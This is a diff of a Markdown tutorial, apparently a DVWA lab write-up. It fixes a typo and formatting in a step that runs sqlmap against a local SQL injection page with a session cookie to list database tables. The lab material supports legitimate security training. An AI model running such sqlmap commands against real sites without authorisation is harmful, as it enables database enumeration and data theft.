@@ -41,10 +41,10 @@ and save the PHPSESSID and security level
 <img src="./PNGs/2.png">
 
 using sqlmap to see all the tables in this web page using this 
-* ##you need to change the url and PHPSESSID
+* you need to change the url and PHPSESSID
 
 ```
-cd cd sqlmap-dev
+cd sqlmap-dev
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
 ```
 using sqlmap to see all tables schema using this comand 
